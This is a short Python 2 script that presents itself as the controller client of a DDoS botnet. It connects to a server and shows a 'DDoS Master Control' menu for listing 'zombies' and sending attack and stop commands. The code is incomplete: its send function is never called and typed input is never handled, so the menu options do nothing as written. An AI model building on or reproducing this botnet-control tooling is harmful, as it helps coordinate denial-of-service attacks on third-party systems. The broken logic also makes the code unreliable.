# telnet program example
import socket, select, string, sys

def printmenu():
    print "==============================="
    print "===== DDoS Master Control ====="
    print "==============================="
    print ""
    print "Choose option [1-4]:"
    print "List all zombies connected\t[1]"
    print "Send attack command\t\t[2]"
    print "Send stop command\t\t[3]"
    print "Close connection from server\t[4]"

def sendmessage(message):
    msg = sys.stdin.readline()
    s.send(msg)

#main function
if __name__ == "__main__":

    if(len(sys.argv) < 3) :
        print 'Usage : python master.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    # connect to remote host
    try :
        s.connect((host, port))
    except :
        print 'Unable to connect'
        sys.exit()

    print 'Connected to remote host'

    while 1:
        socket_list = [sys.stdin, s]
        printmenu()
        # Get the list sockets which are readable
        read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])

        for sock in read_sockets:
            #incoming message from remote server
            if sock == s:
                data = sock.recv(1024)
                if not data :
                    print 'Connection closed'
                    sys.exit()
                else :
                    #print data
                    sys.stdout.write(data)
